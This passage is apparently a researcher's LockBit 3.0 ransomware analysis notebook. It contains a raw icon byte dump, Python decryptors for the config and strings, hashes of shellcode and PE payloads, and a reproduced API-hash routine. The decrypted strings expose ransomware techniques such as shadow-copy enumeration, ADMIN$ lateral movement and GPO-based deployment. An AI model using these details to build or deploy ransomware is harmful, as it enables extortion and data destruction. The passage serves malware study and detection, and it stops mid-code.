xffGFJ xffEEG xff x04 x04 x04 xff x00 x00 x00 xff x04 x04 x04 xff x17 x17 x17 xff x15 x15 x16 xff x16 x16 x16 xff x16 x16 x16 xff x16 x16 x17 xff x16 x16 x17 xff&amp;&amp;&amp; xffccc xff xd3 xd3 xd4 xfe xff xff xff x8e xf7 xf7 xf7 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfe xfe xfe x00 xfc xfc xfc x94 xcc xcc xcc xe5 xc3 xc3 xc3 xe5 xc4 xc4 xc4 xe8 xc3 xc3 xc3 xe8 xc2 xc2 xc2 xe8 xc2 xc2 xc1 xe8 xe7 xe6 xed xe2 xc9 xc9 xc9 xe8 xc9 xc9 xc9 xe8 xc0 xc0 xc0 xe8 xe6 xe6 xe7 xe2 xca xca xca xe7 xc9 xc9 xc9 xe8 xc7 xc7 xc7 xe8 xc2 xc2 xc2 xe8 xc3 xc3 xc3 xe8 xc3 xc3 xc3 xe8 xc3 xc3 xc2 xe8 xc5 xc5 xc5 xe6 xd8 xd8 xd9 xdf xfd xfd xfe xce xff xff xff x8e xff xff xff2 xfa xfa xfa x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xe2 xe2 xe2 x00 xff xff xff x01 xfe xfe xfe x00 xff xff xff t xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x07 xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x07 xff xff xff n xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff n xff xff xff x05 xa4 xa1 xab x00 x00 x00 x00 x00 xcb xcb xcb x00 xfe xfe xfe x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfa xfa xfb x00 xff xff xff x03 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xc0 x00 x00 x7f xc0 x00 x00 x0f xc0 x00 x00 x07 xc0 x00 x00 x07 xc0 x00 x00 x03 xc1 xff xfe x03 xc1 xff xff x03 xc1 xff xff x03 xc1 xfe x00 x03 xc1 xfc x00 x03 xc1 xf8 x00 x07 xc1 xf8 x00 x07 xc1 xf0 x00 x03 xc1 xf8 x00 x03 xc1 xff xff x03 xc1 xff xff x03 xc1 xff xff x03 xc0 x00 x00 x03 xc0 x00 x00 x07 xc0 x00 x00 x07 xc0 x00 x00 x0f xe0 x00 x00? xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff( x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x01 x00 x00 x00 x00 x00 x00@ x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xac xac xac x00 x00 x00 x00 x00 xb6 xb6 xb6 x00 xb6 xb6 xb6 x00 xb6 xb6 xb6 x00 xb5 xb5 xb5 x00 xbf xbf xbf x00 xb4 xb4 xb5 x00 xbb xbb xbc x00 xb5 xb5 xb6 x00 xb4 xb4 xb5 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfc xfc xfc x00 xee xee xee- xf7 xf7 xf8H xf4 xf4 xf4H xf5 xf5 xf5H xf3 xf3 xf3H xff xff xffG xff xff xffH xff xff xffH xff xff xffH xdd xdd xddE xff xff xff! xff xff xff x16 x00 x00 x00 x00 x00 x00 x00 x00 xf5 xf5 xf5 x00000 x00 x9c x9c x9c xc0FEF xffJJJ xffEEF xffHHH xffOOP xff//0 xffPPR xff889 xff xac xac xac xff xb5 xb5 xb5 xf8uuv xf1 xda xda xda x95 xdc xdc xdc x05 x00 x00 x00 x00 x00 x00 x00 x00 x86 x86 x86 xba$$$ xff999 xffMMN xffKKK xff=== xffYY[ xff@@@ xff x7f x7f x80 xf0 xd0 xd0 xd0 xfcQQQ xff x1d x1c x1f xff;;&gt; xff xcd xcd xcdy xa4 xa4 xa5 x00 x00 x00 x00 x00 x83 x83 x83 xb9 x16 x16 x16 xff xb2 xb2 xb3 xc6UUV5 xff xff xff6 xff xff xff6 xff xff xff1 xff xff xff &#39; xff xff xff x10 xfe xfe xff x1d xdc xdc xdcIZZZ xf1 x1f x1e! xff x95 x95 x95 xbf x00 x00 x00 x00 t t t x00 x9b x9b x9b xb8 x06 x06 x06 xff x90 x90 x90 xb3 x00 x00 x00 x00 xcb xcb xcc x00 xe9 xe9 xe9 x00 xff xff xff x05 xff xff xff2 xff xff xff6 xff xff xff3 xdc xdc xdc?jij xec x1f x1f xff x97 x97 x97 xb9 x05 x05 x05 x00 x07 x07 x07 x00 x92 x92 x92 xb8,,, xff x9b x9b x9b xb7 x10 x10 x10 x00 xf3 xf3 xf3 x00 xd5 xd5 xd5% xa8 xa8 xa9 xdcPPP xffMMM xff222 xffOOP xff//3 xff889 xff xd4 xd4 xd3q xad xad xae x00 x00 x00 x01 x00 x8a x8a x8a xb8 x06 x06 x06 xff xa1 xa1 xa1 xb6 x11 x11 x11 x00 x8e x8e x8e x00 xcd xcd xce xa2WWW xffAAB xffKKK xff666 xffDDE xff,,- xff;;&lt; xff xd7 xd7 xd7m xb5 xb5 xb5 x00 r r x0f x00 xa2 xa2 xa3 xb8 x1c x1c x1d xff x87 x87 x87 xb3 x00 x00 x00 x00 xde xde xde x00 xf3 xf3 xf3 x19 xe5 xe5 xe45 xf9 xf9 xf95 xfc xfc xfb5 xff xff xff5 xd8 xd8 xd8UYYY xf1 ! xff x98 x98 x99 xb7 n n x0c x00 x00 x00 x00 x00 x86 x86 x86 xb9### xff xab xab xab xc1111&amp; xff xff xff&amp; xff xff xff x1e xff xff xff x19 xff xff xff x19 xff xff xff x18 xff xff xff x18 xda xda xda &#39;tsu xe8 x1d x1d x1f xff x95 x95 x95 xc0 x00 x00 x00 x00 x01 x01 x01 x00~~~ xc1 x94 x94 x94 xff xae xae xae xfeNNN xfeUUV xfeaab xfeLLL xffjjl xffRQR xfePPP xfeRRR xff &#39; &#39;* xff77: xff xcd xcd xcdz xa3 xa3 xa4 x00 xd3 xd3 xd3 x00 xe6 xe6 xe6 x94 xc3 xc3 xc3 xffOOO xffJJN xff337 xff??@ xff222 xff334 xffCCD xff&gt;&gt;&gt; xffFFG xfffff xfd xd3 xd3 xd3 xa2 xd5 xd5 xd5 x06 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 xd3 xd3 xd3J xd1 xd1 xd1N xe3 xe3 xe4N xf9 xf8 xfcM xe2 xe2 xe2N xfb xfb xfbL xdf xdf xdfN xdd xdd xdcN xdd xdd xddN xea xea xeaJ xff xff xff) x00 x00 x00 x00 x00 x00 x00 x00 xf3 xf3 xf4 x00 xfc xfc xfc x00 x00 x00 x00 x00{{{ x00 x9f x9f x9f x00 x9f x9f xa0 x00 xac xac xb0 x00 x9d x9d x9d x00 xad xad xad x00 xa0 xa0 xa0 x00 xa0 xa0 xa0 x00 x99 x99 x99 x00 x97 x97 x97 x00 xcc xcb xcd x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff x00 x00 xff xff x00 x00 xff xff x00 x00 x80 x03 x00 x00 x80 x01 x00 x00 x8f xf1 x00 x00 x8f xf1 x00 x00 x8e x01 x00 x00 x8c x01 x00 x00 x8f xf1 x00 x00 x8f xf1 x00 x00 x80 x01 x00 x00 x80 x03 x00 x00 xff xff x00 x00 xff xff x00 x00 xff xff x00 x00&#39;) . 15086 . data = unhex(&#39;c520bca5cd3e3e89a0cc855b6c07abae452b39828382ad906bc8a97fbc9c4991143e3cfaf58e5b3529ca694ae4c909589312983f90b2a00d90b1701f50b5481fe061e6012f2ad0701fb7457dbaf35ada5dc96770e5c6a318d8fc01dbcfbf9c23d5ac331a&#39;) decrypt(data, seed) . b&#39;Q xc2 xee xcc x9f xb7twh xe7 x82JF] xbeU xa9 x9a x94. xbeM n xc4+/ x17 xec xad x11&gt;e x10 x82u xb0 xa3 xac xffeQ, x807 xa9O x87 x04O x1a1 x96b. xfa xbc xe0Zgh xde xdf xf1 xb9 x94 xd3 xb1O x18 xfd^7 xf5 xc3&amp;* xb1A xe6 x91 xa9 xe3 x986 xd3 x0e?x xee xa2 x1e xae xa1 x19 xf61 xab t xb3&#39; . Shellcode . Some of the encrypted data is shellcode that is used for thread injection, and token stealing. This code is not compressed. The shellcode files are listed below and can be downloaded from Malshare. . 0d2104672c11ff0822bf096e97225ceab74f1e2ecff7a2a6fde152a081b90b87.bin 2df9218c31586e1ce85d989ea97d9e6a6664d4a50b681914a5b6c44064d5c146.bin d8dd2530a4b2165f16547c237e43dc15adb6e168af5ae8b153793d7aee863d93.bin da2d72e132f9e8706676a72d9bf48a2bd26d9f8014686424ddb927b87637f2a1.bin . Icon . One of the blobs contains an aplib compressed .ico file that is used as a custom icon by Lockbit 3.0. . . PE Files . The blobs also contain 3 PE files that are compressed with aplib, the files are listed below (and can be downloaded from Malshare). . 63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383_pe.bin 917e115cc403e29b4388e0d175cbfac3e7e40ca1742299fbdb353847db2de7c2_pe.bin d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5_pe.bin . TODO: . print RSA key, and affiliate in a nice format | print key matrix data | analyze extracted PE files | . Stack Strings . import uuid import re import struct file_data = open(&#39;/tmp/lock3_dump_SCY.bin&#39;, &#39;rb&#39;).read() decryption_key = 0x4506DFCA def decrypt_str(data, decryption_key): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ decryption_key) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data, decryption_key) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {28532: &#39; *.dll&#39;, 28715: &#39;drv&#39;, 32313: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 35620: &#39;cb8555cc-9128-11d1-ad9b-00c04fd8fdff&#39;, 35658: &#39;dc12a687-737f-11cf-884d-00aa004b2e24&#39;, 35696: &#39;674b6698-ee92-11d0-ad71-00c04fd8fdff&#39;, 35734: &#39;44aca674-e8fc-11d0-a07c-00c04fb68820&#39;, 35775: &#39;__ProviderArchitecture&#39;, 35872: &#39;ROOT CIMV2&#39;, 35927: &#39;ID&#39;, 35954: &#39;SELECT * FROM Win32_ShadowCopy&#39;, 36079: &#39;WQL&#39;, 36106: &#34;Win32_ShadowCopy.ID=&#39;%s&#39;&#34;, 37545: &#39;Global %.8x%.8x%.8x%.8x&#39;, 38303: &#39;Times New Roman&#39;, 39105: &#39;.bmp&#39;, 39328: &#39;Control Panel Desktop&#39;, 39487: &#39;WallPaper&#39;, 39589: &#39;WallpaperStyle&#39;, 39996: &#39;-wall&#39;, 40044: &#39;-pass&#39;, 40352: &#39;WinSta0 Default&#39;, 41849: &#39;EventLog&#39;, 42071: &#39;SOFTWARE Microsoft Windows CurrentVersion WINEVT Channels&#39;, 42287: &#39;SYSTEM CurrentControlSet Services EventLog&#39;, 42454: &#39;O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)&#39;, 42639: &#39;Enabled&#39;, 42677: &#39;ChannelAccess&#39;, 44910: &#39;-gspd&#39;, 44932: &#39;-psex&#39;, 44980: &#39;-pass&#39;, 45229: &#39; . pipe %s&#39;, 48094: &#39;Z: &#39;, 48310: &#39;00021401-0000-0000-c000-000000000046&#39;, 48348: &#39;000214f9-0000-0000-c000-000000000046&#39;, 48386: &#39;0000010b-0000-0000-c000-000000000046&#39;, 51936: &#39;dllhost.exe&#39;, 52206: &#39;Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC&#39;, 52730: &#39;%s.README.txt&#39;, 53030: &#39;WINSPOOL&#39;, 53143: &#39;Consolas&#39;, 53624: &#39;office&#39;, 53677: &#39;onenote&#39;, 56281: &#39;Control Panel International&#39;, 56455: &#39;LocaleName&#39;, 56552: &#39;sLanguage&#39;, 56739: &#39;SOFTWARE Microsoft Windows NT CurrentVersion&#39;, 56952: &#39;ProductName&#39;, 57788: &#39;⸥砸⸥砸⸥砸⸥砸%&#39;, 58220: &#39;POST&#39;, 59193: &#39;䉁䑃䙅䡇䩉䱋乍偏剑呓噕塗婙扡摣晥桧橩汫湭灯牱瑳癵硷穹 u3130㌲㔴㜶㤸&#39;, 59315: &#39;%s=%s&#39;, 59650: &#39;猥┽s&#39;, 59674: &#39;⸥砸⸥砸⸥砸⸥砸%&#39;, 59722: &#39;䉁䑃䙅䡇䩉䱋乍偏剑呓噕塗婙扡摣晥桧橩汫湭灯牱瑳癵硷穹 u3130㌲㔴㜶㤸&#39;, 60261: &#39;甥┮u&#39;, 60627: &#39;甥┮u&#39;, 64353: &#39;䉁䑃䙅䡇䩉䱋乍偏剑呓噕塗婙扡摣晥桧橩汫湭灯牱瑳癵硷穹 u3130㌲㔴㜶㤸&#39;, 67512: &#39; %s &#39;, 67796: &#39;LDAP://rootDSE&#39;, 67918: &#39;defaultNamingContext&#39;, 68033: &#39;LDAP://CN=Computers,&#39;, 68220: &#39;dNSHostName&#39;, 68275: &#39; %s &#39;, 70308: &#39; . pipe {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 72037: &#39;ExchangeInstallPath&#39;, 72147: &#39;Program Files&#39;, 72256: &#39;Mailbox&#39;, 73166: &#39;SOFTWARE %s&#39;, 73221: &#39;hScreen&#39;, 76670: &#39;%02X&#39;, 76908: &#39;Software Microsoft Windows CurrentVersion Group Policy Status&#39;, 79370: &#39; . pipe %s&#39;, 79560: &#39;-safe&#39;, 80461: &#39; %s.%s &#39;, 80571: &#39; . pipe %s&#39;, 80877: &#39;%s_IPC$&#39;, 81005: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 81867: &#39;WinSta0 Default&#39;, 82438: &#39;ADMIN$&#39;, 82479: &#39;IPC$&#39;, 82513: &#39;%spipe %s&#39;, 82561: &#39;%%SystemRoot%% Temp %s.exe -k LocalServiceNetworkRestricte&#39;, 82854: &#39;%sADMIN$ Temp %s.exe&#39;, 82944: &#39;%sADMIN$ Temp&#39;, 84119: &#39;%02X&#39;, 84334: &#39;LDAP://rootDSE&#39;, 84439: &#39;defaultNamingContext&#39;, 84570: &#39;LDAP://CN=Policies,CN=System,%s&#39;, 84779: &#39;displayName&#39;, 84962: &#39;distinguishedName&#39;, 85218: &#39;%02X&#39;, 85476: &#39;Software Microsoft Windows CurrentVersion Group Policy Status&#39;, 85937: &#39;ADMIN$&#39;, 86010: &#39;IPC$&#39;, 86064: &#39;%spipe %s&#39;, 86266: &#39;%sADMIN$ Temp&#39;, 86369: &#39;%sADMIN$ Temp %s.exe&#39;, 86647: &#39;%%SystemRoot%% Temp %s.exe&#39;, 87626: &#39;LDAP://rootDSE&#39;, 87731: &#39;defaultNamingContext&#39;, 88054: &#39;File&#39;, 88146: &#39;Services&#39;, 88235: &#39;Preferences&#39;, 88306: &#39;ScheduledTasks&#39;, 88418: &#39;NetworkShare&#39;, 88545: &#39;〥搴┭㈰ⵤ〥搲┠㈰㩤〥搲┺㈰d&#39;, 88693: &#39;{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 89115: &#39;GPT.INI&#39;, 89231: &#39;2621892&#39;, 89255: &#39;[General] r nVersion=%s r ndisplayName=%s r n&#39;, 90228: &#39; %s sysvol %s scripts &#39;, 90805: &#39;吥浥䑰物%&#39;, 91413: &#39;NT AUTHORITY SYSTEM&#39;, 92018: &#39;Registry.pol&#39;, 92077: &#39;comment.cmtx&#39;, 93391: &#39;gPCMachineExtensionNames&#39;, 93627: &#39;gPCUserExtensionNames&#39;, 93846: &#39;versionNumber&#39;, 93905: &#39;2621892&#39;, 94425: &#39;LDAP://%s/DC=%s,DC=%s&#39;, 94666: &#39;LDAP://DC=%s,DC=%s&#39;, 94837: &#39;LDAP://CN=%s,CN=Policies,CN=System,DC=%s,DC=%s&#39;, 95225: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 95266: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 95739: &#39;ADMIN$&#39;, 95804: &#39;IPC$&#39;, 95862: &#39;%spipe %s&#39;, 96096: &#39;%sADMIN$ Temp&#39;, 96203: &#39;%sADMIN$ Temp %s.exe&#39;, 96539: &#39;%%SystemRoot%% Temp %s.exe&#39;, 97082: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 97123: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 97244: &#39;LDAP://%s&#39;, 97583: &#39;-gdel&#39;, 97631: &#39;-pass&#39;} . Analysis of The Embedded PE Files . Our samples hash: d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5. . The sample uses a dynamic API resolving routine similar to the main Lockbit binary, all APIs are resolved in a &quot;API table&quot;, though the actual API hash algorithm is different. . @c3rb3ru5d3d53c converted this into a python script that will generate the API hashes for you. She also has a nice blog post. . The API Hash Algorithm . The hash algorithm has a hard coded key which can be modified via an optional seed, the rest of the algorthm is a simple ROT-13 add, same as the lockbit main. This hash algorithm is used to hash the lowercase string of the DLL, which is then used as the seed for the API hashes. . Example from c3rb3ru5d3d53c&#39;s blog post with xor key 0x3B029FD4: . 0xaae0cefb -&gt; kernel32.dll FindFirstFileExW . def ror(n,rotations=1,width=32): return (2**width-1)&amp;(n&gt;&gt;rotations|n&lt;&lt;(width-rotations)) def hash_algo(string, seed): string = string + b&#39; x00&#39; result = 0xC8B32494 ^ seed for c in string: result = ror(result, rotations=0x0d, width=32) result = (result + c) &amp; 0xffffffff if c == 0x00: break return result def get_api_hash(dll_name, api_name, seed, xor_key): dll_name = dll_name.lower() dll_hash = hash_algo(dll_name, seed) tmp_hash = hash_algo(api_name, dll_hash) return (~tmp_hash &amp; 0xffffffff) ^ xor_key . This algorithm is now in hashdb. . Obfuscated VTables . For some reason the developers create &quot;obfuscated&quot; jumps to the exisiting vtables in the code. This is done by taking the function addresses in the vtables and encrypting them, then the encrypted address is placed in some hardcoded shellcode that is used to decrypt and call the address. Each encrypted address/shellcode blob is then called from the code creating some simple obfuscated &quot;redirect&quot; to the actual vtable function. . . String Decryption . Stolen from @c3rb3ru5d3d53c with &lt;3 . import struct def decrypt_str(data): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ 0x3B029FD4) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result dd = struct.pack(&#39;&lt;I&#39;,0x397F36FB) dd += struct.pack(&#39;&lt;I&#39;,0x0D5339D3E) dd += struct.pack(&#39;&lt;I&#39;,0x0A4FFA480) dd += struct.pack(&#39;&lt;I&#39;,0x9788FEA7) dd = struct.pack(&#39;&lt;I&#39;,0x0C4B96067) dd += struct.pack(&#39;&lt;I&#39;,0x0C4AD606A) dd += struct.pack(&#39;&lt;I&#39;,0x0C4D26011) dd += struct.pack(&#39;&lt;I&#39;,0x0C48F6004) dd += struct.pack(&#39;&lt;I&#39;,0x0C4926044) dd += struct.pack(&#39;&lt;I&#39;,0x0C4B9605F) dd += struct.pack(&#39;&lt;I&#39;,0x0C4B86078) dd += struct.pack(&#39;&lt;I&#39;,0x0C4FD602B) decrypt_str(dd) . b&#39;L x00D x00A x00P x00: x00/ x00/ x00r x00o x00o x00t x00D x00S x00E x00 x00 x00 x00 x00&#39; . import re import struct # C7 00 (?? ?? ?? ??) # C7 40 ?? (?? ?? ?? ??) test_data = unhex(&#39;8d8520ffffffc7006760b9c4c740046a60adc4c740081160d2c4c7400c0460bec4c740106560c0c4c740147b6092c4c74018476094c4c7401c486094c4c740204e608ec4c740240760bec4c740286560c0c4c7402c786084c4c74030586089c4c740344e6090c4c740380760d8c4c7403c5860fdc48b15785140006a1050&#39;) #egg = rb&quot;(?P&lt;bytes&gt;(?P&lt;opcode_byte&gt;.)(?:.){1,2}(?P&lt;imm_data&gt;.){4})&quot; out = b&#39;&#39; egg = br&#39; xc7 x00(....)(?P&lt;raw&gt;(?: xc7 x40.....){1,})&#39; for match in re.finditer(egg, test_data): out += match.group(1) g2 = match.group(2) for s in g2.split(b&#39; xc7 x40&#39;): out += s[-4:] decrypt_str(out) . b&#39;L x00D x00A x00P x00: x00/ x00/ x00C x00N x00= x00P x00o x00l x00i x00c x00i x00e x00s x00, x00C x00N x00= x00S x00y x00s x00t x00e x00m x00, x00% x00s x00 x00 x00&#39; . import uuid file_data = open(&#39;/tmp/d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5_pe.bin&#39;, &#39;rb&#39;).read() #if all(not character for character in b&quot;A x00B x00C x00D x00E x00F x00G x00 x00&quot;[1::2]): # print(&quot;not guid&quot;) # output: bytes = b&quot;&quot; # for match in re.finditer(rb&quot;(?P&lt;opcode&gt;[ xC7])(?:[ x00- x03, x06- x07]|[ x40- x43, x46- x47,].)(?P&lt;imm_data&gt;.{4})&quot;, b&quot; xC7 x07sihT xC7 x40 x20 si xC7 x40 x20ts a xC7 x40 x20gnir&quot;): # output += match.group(&quot;imm_data&quot;)[::-1] # print(output) # decrypt_string here # &gt;&gt;&gt; b&#39;This is a string&#39; # The registers used for the stack string are # 0 1 2 3 6 7 def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {2962: &#39; *.dll&#39;, 3152: &#39;drv&#39;, 7065: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 7107: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 7232: &#39;LDAP://%s&#39;, 7804: &#39;/C DEL /F /Q &#39;, 7900: &#39; &gt;&gt; NUL&#39;, 7991: &#39; cmd.exe&#39;, 8348: &#39;LDAP://rootDSE&#39;, 8459: &#39;defaultNamingContext&#39;, 8596: &#39;LDAP://CN=Policies,CN=System,%s&#39;, 8817: &#39;displayName&#39;, 9023: &#39;distinguishedName&#39;, 9801: &#39;File&#39;, 9898: &#39;Preferences&#39;, 10193: &#39;牦浯慐桴∽&#39;, 10661: &#39;%s_IPC$&#39;, 10812: &#39; . pipe {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;} . IDA Python Script to Label Strings . def set_hexrays_comment(address, text): &#39;&#39;&#39; set comment in decompiled code &#39;&#39;&#39; cfunc = idaapi.decompile(address) tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() def set_comment(address, text): ## Set in dissassembly idc.set_cmt(address, text,0) ## Set in decompiled data set_hexrays_comment(address, text) string_map = {} for offset,string_value in string_map.items(): va = idaapi.get_fileregion_ea(offset) set_comment(va, string_value) . Functionality -- STILL TO BE COMPLETED . The binary registers itself as a service, then creates a named pipe which will recieve 4 bytes to be be converted into a DWORD time value and sent to a thread. The thread&#39;s sole purpose is to sleep for the DWORD amount of time. The threads are also hidden from the debugger. It is not clear why this functionality exists, maybe as some sort of time delay? . The named pipe name is generated using the MD5 of the string | . | . 0 . _IPC$ The MD5 is then converted into a &quot;GUID&quot; format following this pattern | . . pipe {GUID} The binary scans AD via the COM interface and I think accesses the ransom binary remotely from the AD server | The Restart Manager is used to collect a list of services and processes that block the ransomware execution which are then terminated | I don&#39;t know why they don&#39;t launch the ransomware? | The ransomware is then overwritten with garbage and deleted | . Tools . Welcome to MagNumDB is useful for looking up COM GUIDs | . References . Restart manager | . Analysis of The 2nd PE . Sample: 63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383 . String Decryption . The string decryption algorithm is the same but uses a different key. . import uuid import re import struct file_data = open(&#39;/tmp/63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383_pe.bin&#39;, &#39;rb&#39;).read() decryption_key = 0x29009FE6 def decrypt_str(data, decryption_key): result = b&#39;&#39; if (len(data) 